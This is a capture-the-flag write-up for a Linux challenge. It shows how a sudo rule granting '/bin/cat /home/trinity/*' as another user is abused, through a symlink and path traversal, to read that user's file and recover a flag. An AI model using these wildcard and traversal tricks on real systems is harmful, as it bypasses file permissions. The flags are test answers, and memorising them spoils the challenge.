# Level 6

![](https://i.imgur.com/d6Cwkmp.png)

```shell
$ sshpass -p Flag-08grILsn3ekqhDK7cKBV6ka8B ssh trinity@challenges.ringzer0team.com -p 10090
```

![](https://i.imgur.com/6p1BA7Z.png)

```shell
trinity@forensics:~$ ls -la
total 72
drwxr-x--- 8 trinity trinity  4096 Jun 23 18:03 .
drwxr-xr-x 8 root    root     4096 May 30 18:08 ..
lrwxrwxrwx 1 trinity trinity     9 Jun  3 17:44 .bash_history -> /dev/null
-rwxr-x--- 1 trinity trinity   252 May 30 18:07 .bash_logout
-rwxr-x--- 1 trinity trinity  2632 May 30 18:07 .bashrc
drwx------ 2 trinity trinity  4096 May 31 02:23 .cache
-rw------- 1 trinity trinity    73 Jun 14 18:35 .lesshst
-rw------- 1 trinity trinity    60 Jun  1 15:16 .mysql_history
drwxrwxr-x 2 trinity trinity  4096 Jun  3 17:38 .nano
-rwxr-x--- 1 trinity trinity   674 May 30 18:07 .profile
drwxr-xr-x 2 trinity trinity  4096 Jun 18 16:09 .vim
-rw------- 1 trinity trinity 10850 Jun 23 18:03 .viminfo
drwxrwxr-x 5 trinity trinity  4096 Jun 20 01:45 _tmp
-rw-rw-r-- 1 trinity trinity    63 Jun 15 03:49 log
lrwxrwxrwx 1 trinity trinity    19 Jun 18 15:22 ne -> /home/neo/phonebook
-rwxr-x--- 1 trinity trinity   124 May 30 18:07 phonebook
drwxrwx--x 2 trinity trinity  4096 Jun 23 14:10 tmp
drwxrwxr-x 4 trinity trinity  4096 Jun 20 02:58 var
```

So, obviously, phonebook only `neo` THE CHOSEN ONE can read.

However, seems that someone make link ne to neo's phonebook, if we can `cat` this link, may find something.

To get permission to take place of neo, we need `sudo`.

```shell
trinity@lxc-sysadmin:~$ sudo cat ne
[sudo] password for trinity: 
Sorry, user trinity is not allowed to execute '/bin/cat ne' as root on lxc-sysadmin.

trinity@forensics:~$ sudo -l
Matching Defaults entries for trinity on lxc-sysadmin:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User trinity may run the following commands on lxc-sysadmin:
    (neo) /bin/cat /home/trinity/*
```

Follow by clue :`(neo) /bin/cat /home/trinity/*`, let's go to `bin/cat /home/trinity/*` with chosen one :`neo`.

```shell
trinity@forensics:~$ sudo -u neo /bin/cat /home/trinity/*
Fri Jun 15 03:49:24 UTC 2018
trinity
Gathering.py
Gathering.py
The Oracle        1800-133-7133
Persephone        345-555-1244




change my current password FLAG-lRGLKGh2895wIAoOvcBbgk4oL
don't forget to remove this :) 
The Oracle        1800-133-7133
Persephone        345-555-1244





copy made by Cypher copy utility on /home/neo/phonebook
/bin/cat: /home/trinity/tmp: Is a directory
/bin/cat: /home/trinity/_tmp: Is a directory
/bin/cat: /home/trinity/var: Is a directory
```

If we follow by clue :`/home/neo/phonebook` and type `sudo -u neo /bin/cat /home/trinity/../neo/phonebook` may found exactly file.

But knowm someone left the link.

Answer:
```
FLAG-lRGLKGh2895wIAoOvcBbgk4oL
```